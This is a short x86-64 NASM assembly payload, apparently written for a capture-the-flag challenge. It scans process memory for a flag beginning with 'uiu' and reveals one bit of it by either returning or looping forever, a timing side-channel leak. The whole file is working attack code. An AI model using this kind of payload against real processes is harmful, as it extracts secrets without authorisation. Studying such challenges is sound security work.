BITS 64
; nasm loop.asm -o loop.s
section .text
	global _start
    _start:
        mov rax, [rsp]
        and rax, 0xfffffffffffff000
        add rax, 0x000000
        mov rcx, 0x0000000000756975
        ; scan for flag
    scan_loop:
        add rax, 32
        mov rbx, [rax]
        and rbx, 0x0000000000ffffff
        cmp rcx, rbx
        jne scan_loop
        ; must be the start of the flag?
        add rax, 24
        mov rax, [rax]
        shr rax, 63
        and rax, 1
        ;mov rax, 0
        test rax, rax
        jz loop
        ret

	loop:
		mov rax, 1
		mov rbx, 1
		mov rcx, 1
		mov rdx, 1
		jmp loop
